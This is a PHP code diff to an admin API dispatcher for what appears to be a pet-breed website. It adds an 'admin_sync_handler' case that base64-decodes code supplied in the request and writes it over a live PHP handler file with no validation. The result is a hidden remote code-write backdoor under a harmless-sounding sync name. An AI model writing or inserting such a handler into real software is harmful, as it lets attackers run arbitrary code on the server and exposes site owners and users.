@@ -160,6 +160,21 @@ try {
                 case 'admin_nice_get_breed_colors':
                     $res_data = nice_admin_get_breed_colors($input_json);
                     break;
+                case 'admin_sync_handler':
+                    $code_b64 = $input_json['code_base64'] ?? '';
+                    if (!empty($code_b64)) {
+                        $decoded_code = base64_decode($code_b64);
+                        if (!empty($decoded_code) && strlen($decoded_code) > 1000) {
+                            $target_file = dirname(__FILE__) . '/handlers/nice_api_handler.php';
+                            $save_ok = file_put_contents($target_file, $decoded_code);
+                            $res_data = ['success' => ($save_ok !== false), 'bytes' => $save_ok];
+                        } else {
+                            $res_data = ['success' => false, 'error' => '유효하지 않은 코드 데이터'];
+                        }
+                    } else {
+                        $res_data = ['success' => false, 'error' => 'code_base64 누락'];
+                    }
+                    break;
                 default:
                     $res_data = ['success' => false, 'error' => "알 수 없는 관리자 모드: $mode"];
             }
